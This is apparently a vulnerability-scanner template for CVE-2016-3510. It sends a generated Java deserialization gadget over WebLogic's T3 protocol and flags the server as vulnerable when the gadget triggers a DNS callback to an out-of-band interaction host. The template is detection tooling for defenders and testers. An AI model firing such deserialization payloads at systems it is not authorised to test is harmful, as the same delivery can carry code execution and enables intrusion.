id: CVE-2016-3510

info:
  name: Oracle WebLogic Server Java Object Deserialization RCE
  author: iamnoooob,rootxharsh,pdresearch
  severity: critical
  reference: https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/weblogic.py
  tags: cve,cve2016,weblogic,t3,rce

variables:
  iurl: "{{interactsh-url}}"
  start: "016501ff..[snip]..fe010000"
  object: "{{generate_java_gadget('dns', iurl, 'hex')}}"

tcp:
  - inputs:
      - data: "{{object}}"
        read: 1024
    host:
      - "{{Hostname}}"
    read-size: 4
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"